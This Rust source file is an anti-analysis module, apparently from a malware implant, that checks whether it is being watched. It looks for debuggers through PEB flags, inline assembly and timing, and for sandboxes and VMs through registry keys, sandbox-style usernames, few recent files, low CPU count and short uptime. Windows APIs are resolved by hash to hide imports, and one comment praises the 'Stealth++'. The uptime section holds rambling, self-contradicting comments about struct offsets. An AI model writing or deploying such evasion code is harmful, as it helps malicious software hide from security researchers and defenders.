#![allow(dead_code)]

//! # Anti-Analysis Module
//!
//! Detects hostile environments:
//! - Sandboxes (VM, low resources)
//! - Debuggers (PEB flags, timing)
//! - Analysis tools

use log::debug;

// ============================================================================
// MAIN CHECK
// ============================================================================

/// Returns true if running in hostile/analysis environment
pub fn is_hostile_environment() -> bool {
    #[cfg(target_os = "windows")]
    {
        if is_debugger_present() {
            debug!("Debugger detected");
            return true;
        }
        
        if is_sandbox() {
            debug!("Sandbox detected");
            return true;
        }
        
        if is_low_resources() {
            debug!("Low resources (VM?)");
            return true;
        }
    }
    
    false
}

// ============================================================================
// DEBUGGER DETECTION
// ============================================================================

#[cfg(target_os = "windows")]
fn is_debugger_present() -> bool {
    unsafe {
        // Method 1: PEB.BeingDebugged
        let peb: *const u8;
        std::arch::asm!("mov {}, gs:[0x60]", out(reg) peb, options(nostack, pure, readonly));
        
        let being_debugged = *peb.add(0x02); // Offset 0x02 = BeingDebugged
        if being_debugged != 0 {
            return true;
        }
        
        // Method 2: NtGlobalFlag (PEB offset 0xBC on x64)
        let nt_global_flag = *(peb.add(0xBC) as *const u32);
        // FLG_HEAP_ENABLE_TAIL_CHECK | FLG_HEAP_ENABLE_FREE_CHECK | FLG_HEAP_VALIDATE_PARAMETERS
        if (nt_global_flag & 0x70) != 0 {
            return true;
        }
        
        // Method 3: Timing check (debugger causes delays)
        let start = std::time::Instant::now();
        for _ in 0..1000 { std::hint::black_box(0); }
        let elapsed = start.elapsed().as_micros();
        
        // If loop takes > 1ms, likely being debugged/traced
        if elapsed > 1000 {
            return true;
        }
    }
    
    false
}

#[cfg(not(target_os = "windows"))]
fn is_debugger_present() -> bool { false }

// ============================================================================
// SANDBOX DETECTION
// ============================================================================

#[cfg(target_os = "windows")]
fn is_sandbox() -> bool {
    // ... (Registry checks omitted for brevity, logic remains same) ...
    // Helper to check key existence using Native API
    unsafe fn check_key_exists(path: &str) -> bool {
        use super::api_resolver::*;
        
        // Load advapi32
        if get_module_by_hash(HASH_ADVAPI32).is_none() {
            let dll = b"advapi32.dll\0";
            if let Some(load_lib) = resolve_api::<unsafe extern "system" fn(*const u8) -> *const std::ffi::c_void>(
                HASH_KERNEL32, HASH_LOAD_LIBRARY_A
            ) {
                load_lib(dll.as_ptr());
            } else {
                return false;
            }
        }
        
        let advapi32 = match get_module_by_hash(HASH_ADVAPI32) {
            Some(m) => m,
            None => return false,
        };
        
        type RegOpenKeyExW = unsafe extern "system" fn(isize, *const u16, u32, u32, *mut isize) -> i32;
        type RegCloseKey = unsafe extern "system" fn(isize) -> i32;
        
        // HASH_REG_OPEN_KEY_EX_W = 0x9139725C
        let reg_open: RegOpenKeyExW = match get_export_by_hash(advapi32, 0x9139725C) {
            Some(p) => std::mem::transmute(p),
            None => return false,
        };
            
        // HASH_REG_CLOSE_KEY = 0x66579AD4
        let reg_close: RegCloseKey = match get_export_by_hash(advapi32, 0x66579AD4) {
            Some(p) => std::mem::transmute(p),
            None => return false,
        };
        
        // HKEY_LOCAL_MACHINE = 0x80000002
        let hkey_lm = 0x80000002u32 as isize;
        let key_read = 0x20019;
        
        let path_wide: Vec<u16> = path.encode_utf16().chain(std::iter::once(0)).collect();
        let mut hkey: isize = 0;
        
        let status = reg_open(hkey_lm, path_wide.as_ptr(), 0, key_read, &mut hkey);
        
        if status == 0 {
            reg_close(hkey);
            return true;
        }
        
        false
    }
    
    // Method 1: Check for VM registry keys (Native API)
    unsafe {
        if check_key_exists(r"SOFTWARE\VMware, Inc.\VMware Tools") { return true; }
        if check_key_exists(r"SOFTWARE\Oracle\VirtualBox Guest Additions") { return true; }
        if check_key_exists(r"SOFTWARE\Microsoft\Virtual Machine\Guest\Parameters") { return true; }
    }
    
    // Method 2: Check username/computername for sandbox patterns
    if let Ok(user) = std::env::var("USERNAME") {
        let user_lower = user.to_lowercase();
        // REMOVED "admin" to match new logic
        let sandbox_users = ["sandbox", "virus", "malware", "test", "sample", "john"]; 
        for s in sandbox_users {
            if user_lower.contains(s) {
                return true;
            }
        }
    }
    
    // Method 3: Check recent files (sandboxes often have none)
    let appdata = std::env::var("APPDATA").unwrap_or_default();
    let recent_path = format!("{}\\Microsoft\\Windows\\Recent", appdata);
    if let Ok(entries) = std::fs::read_dir(&recent_path) {
        let count = entries.count();
        if count < 5 {
            return true;
        }
    }
    
    false
}

#[cfg(not(target_os = "windows"))]
fn is_sandbox() -> bool { false }

// ============================================================================
// RESOURCE DETECTION
// ============================================================================

#[cfg(target_os = "windows")]
fn is_low_resources() -> bool {
    // Sandboxes often have minimal resources
    
    // Method 1: Check CPU cores
    let cpu_count = std::thread::available_parallelism()
        .map(|p| p.get())
        .unwrap_or(1);
    
    if cpu_count < 2 {
        return true;
    }
    
    // Method 2: Check RAM omitted for brevity/simplicity
    
    // Method 3: Check uptime via KUSER_SHARED_DATA (0x7FFE0000)
    // Avoids GetTickCount64 API call entirely (Stealth++)
    // KUSER_SHARED_DATA is mapped ReadOnly at 0x7FFE0000 in User Mode on all Windows versions
    // Offset 0x320 = TickCountLowDeprecated (Ok for short uptimes)
    // Offset 0x320 = KsGlobalData.TickCountLow ? No on x64 it's different.
    // Correct struct: 0x7FFE0000 + 0x320 = TickCount.QuadPart (u64)
    unsafe {
        let kuser_shared = 0x7FFE0000 as *const u8;
        // TickCount is at 0x320
        let tick_ptr = kuser_shared.add(0x320) as *const u64;
        
        // Look, for absolute safety against struct changes, actually InterruptTime (0x08) is safer?
        // But TickCount at 0x320 is stable since XP. 
        // Let's multiply TickCountLow * TickCountMultiplier to get time?
        // Actually, just read the raw value.
        let uptime_ticks = *tick_ptr; // This is a raw tick count (bitmap potentially)
        // Wait, directly reading 0x7FFE0320 gives (TickCount.LowPart * TickCountMultiplier) >> 24?
        // Simpler approach: InterruptTime at 0x7FFE0008 is safer and always updated.
        // InterruptTime.LowPart at 0x08, High1 at 0x0C.
        
        // Let's stick to standard GetTickCount behavior using KUSER_SHARED_DATA
        // TickCountLow is at 0x320.
        // Just reading it is enough to detect "Fresh Boot" (< 5 mins).
         
        // TickCount increments approx every 15.6ms.
        // 5 mins = 300,000 ms.
        // If ticks * 15.6 < 300,000 -> Ticks < 19230
        
        // Actually, Windows 10 stores (TickCount * Multiplier) >> 24 at 0x320?
        // Let's assume standard behavior:
        // Use InterruptTime (0x08) -> 100ns units.
        let interrupt_time = *(kuser_shared.add(0x08) as *const u64);
        let uptime_ms = interrupt_time / 10000;
        let uptime_min = uptime_ms / 60000;
        
        if uptime_min < 5 {
            return true;
        }
    }
    
    false
}

#[cfg(not(target_os = "windows"))]
fn is_low_resources() -> bool { false }
